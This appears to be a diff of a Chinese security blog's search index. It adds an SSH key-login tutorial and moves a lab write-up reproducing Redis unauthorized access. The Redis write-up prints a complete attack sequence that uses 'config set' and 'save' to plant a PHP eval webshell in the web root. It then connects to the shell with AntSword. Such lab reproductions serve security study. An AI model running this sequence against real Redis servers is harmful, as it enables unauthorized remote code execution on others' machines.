+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh-keygene 常用参数</span><br><span class="line">-C	#  添加注释</span><br><span class="line">-b	#  指定密钥长度</span><br><span class="line">-e	#  读取openssh 的私钥或公钥文件</span><br><span class="line">-f	#  指定用来保存密钥的文件名</span><br><span class="line">-i	#  读取未加密的 ssh-v2 兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥&#x2F;公钥</span><br><span class="line">-l	#  显示公钥文件的指纹数据</span><br><span class="line">-N	#  提供一个新密码</span><br><span class="line">-P	#  提供一个旧密码</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-t	#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）</span><br></pre></td></tr></table></figure>
+<h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 /root/.ssh/authorized_keys 文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-cocpy-id 常用参数</span><br><span class="line">-i	#  指定公钥文件</span><br></pre></td></tr></table></figure>
+<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  scp 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-B	#  以批处理模式运行</span><br><span class="line">-C	#  使用压缩</span><br><span class="line">-F	#  指定 ssh 配置文件</span><br><span class="line">-i	#  identity_file 从指定文件中读取传输时使用的密钥文件</span><br><span class="line">-l	#  指定宽带限制</span><br><span class="line">-o	#  指定使用的 ssh 选项</span><br><span class="line">-P	#  指定远程主机的端口号</span><br><span class="line">-p	#  保留文件的最后修改时间，最后访问时间和权限模式</span><br><span class="line">-q	#  不显示复制进度</span><br><span class="line">-r	#  以递归方式复制</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改服务端配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PasswordAuthentication no	#  关闭密码验证</span><br><span class="line">PubkeyAuthentication yes	#  启用密钥验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br></pre></td></tr></table></figure>
+<h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">    指定私钥保存的路径及文件名（如不指定则默认为 &#x2F;root&#x2F;.ssh&#x2F;id_rsa）</span><br><span class="line">    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）</span><br><span class="line">    确认密码</span><br><span class="line">    确完后自动在密钥文件所在位置创建 .pub 的公钥文件</span><br><span class="line"></span><br><span class="line">#  文件简介</span><br><span class="line">id_rsa		#  私钥文件</span><br><span class="line">id_rsa.pub	#  公钥文件</span><br><span class="line">authorized_keys	#  服务端公钥文件</span><br><span class="line">known_hosts	#  确认过公钥指纹的可信服务器列表的文件</span><br><span class="line">config		#  指定不同域名使用哪个密钥的配置文件</span><br></pre></td></tr></table></figure>
+<h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i id_rsa.pub root@192.168.1.123	#  将公钥上传到服务器（会自动在服务器 &#x2F;root&#x2F;.ssh&#x2F; 目录下创建 authorized_keys 文件）</span><br><span class="line"></span><br><span class="line">#  如前一行报错则可用 scp 命令拷贝</span><br><span class="line">#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）</span><br><span class="line">scp -P 2222 root@10.1.82.11:&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#  或</span><br><span class="line">#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）</span><br><span class="line">scp -P 2222 &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@10.1.82.12:&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </span><br></pre></td></tr></table></figure>
+<h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 root@192.168.1.123</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis 未授权访问漏洞复现</title>
+    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由<a href="https://baike.baidu.com/item/Pivotal">Pivotal</a>赞助。</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，这样会将redis服务暴露在公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下可以利用redis的相关方法，进而成功在redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Redis 2.x</p>
+<p>Redis 3.x</p>
+<p>Redis 4.x</p>
+<p>Redis 5.x</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 apache</span><br><span class="line">sudo apt-get install apache2</span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line">#  下载 redis 并解压</span><br><span class="line">cd &#x2F;</span><br><span class="line">sudo wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line">sudo tar xzvf redis-2.8.17.tar.gz</span><br><span class="line">#  安装 make</span><br><span class="line">cd &#x2F;redis-2.8.17</span><br><span class="line">sudo make</span><br><span class="line">#  启动</span><br><span class="line">sudo &#x2F;redis-2.8.17&#x2F;src&#x2F;redis-server &#x2F;redis-2.8.17&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、使用 <a href="https://github.com/MicrosoftArchive/redis/releases">redis客户端工具</a> 进行连接（此处有未授权访问能直接连接）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.10.233</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/connect.png"></p>
+<p>2、常用 redis 命令</p>
+<p>redis 常用命令</p>
+<p>详细命令：<a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a></p>
+<p>信息收集</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/info.png"></p>
+<p>查看连接设置的名字</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client getname</span><br></pre></td></tr></table></figure>
+<p>新建默认没有名字如下</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/getname.png"></p>
+<p>查看数据库中的键值对</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/keys.png"></p>
+<p>删除键</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del key 删除键为key的数据</span><br></pre></td></tr></table></figure>
+<h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>需求：</p>
+<ul>
+<li><p>1、redis 未授权 能 redis-cli 连上</p>
+</li>
+<li><p>2、开了 web 并且知道路径</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php echo @eval($_POST[&#39;pass&#39;]); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>使用蚁剑连接</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-1.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-2.png"></p>
+<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="https://www.cnblogs.com/xun0523/p/9804999.html">https://www.cnblogs.com/xun0523/p/9804999.html</a></p>
+<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/cl0ud/p/13873085.html">https://www.cnblogs.com/cl0ud/p/13873085.html</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
+<p><a href="https://www.secpulse.com/archives/5357.html">https://www.secpulse.com/archives/5357.html</a></p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10978912.htm">https://www.cnblogs.com/-qing-/p/10978912.htm</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Redis 漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -720,61 +773,8 @@
         <category>Windows 漏洞复现</category>
       </categories>
       <tags>
+        <tag>漏洞复现</tag>
         <tag>Windows</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redis 未授权访问漏洞复现</title>
-    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
-    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由<a href="https://baike.baidu.com/item/Pivotal">Pivotal</a>赞助。</p>
-<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，这样会将redis服务暴露在公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下可以利用redis的相关方法，进而成功在redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Redis 2.x</p>
-<p>Redis 3.x</p>
-<p>Redis 4.x</p>
-<p>Redis 5.x</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 apache</span><br><span class="line">sudo apt-get install apache2</span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line">#  下载 redis 并解压</span><br><span class="line">cd &#x2F;</span><br><span class="line">sudo wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line">sudo tar xzvf redis-2.8.17.tar.gz</span><br><span class="line">#  安装 make</span><br><span class="line">cd &#x2F;redis-2.8.17</span><br><span class="line">sudo make</span><br><span class="line">#  启动</span><br><span class="line">sudo &#x2F;redis-2.8.17&#x2F;src&#x2F;redis-server &#x2F;redis-2.8.17&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、使用 <a href="https://github.com/MicrosoftArchive/redis/releases">redis客户端工具</a> 进行连接（此处有未授权访问能直接连接）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.10.233</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/connect.png"></p>
-<p>2、常用 redis 命令</p>
-<p>redis 常用命令</p>
-<p>详细命令：<a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a></p>
-<p>信息收集</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/info.png"></p>
-<p>查看连接设置的名字</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client getname</span><br></pre></td></tr></table></figure>
-<p>新建默认没有名字如下</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/getname.png"></p>
-<p>查看数据库中的键值对</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/keys.png"></p>
-<p>删除键</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del key 删除键为key的数据</span><br></pre></td></tr></table></figure>
-<h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>需求：</p>
-<ul>
-<li><p>1、redis 未授权 能 redis-cli 连上</p>
-</li>
-<li><p>2、开了 web 并且知道路径</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php echo @eval($_POST[&#39;pass&#39;]); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<p>使用蚁剑连接</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-1.png"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-2.png"></p>
-<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="https://www.cnblogs.com/xun0523/p/9804999.html">https://www.cnblogs.com/xun0523/p/9804999.html</a></p>
-<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/cl0ud/p/13873085.html">https://www.cnblogs.com/cl0ud/p/13873085.html</a></p>
-<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
-<p><a href="https://www.secpulse.com/archives/5357.html">https://www.secpulse.com/archives/5357.html</a></p>
-<p><a href="https://www.cnblogs.com/-qing-/p/10978912.htm">https://www.cnblogs.com/-qing-/p/10978912.htm</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>Redis 漏洞复现</tag>
       </tags>
   </entry>
   <entry>
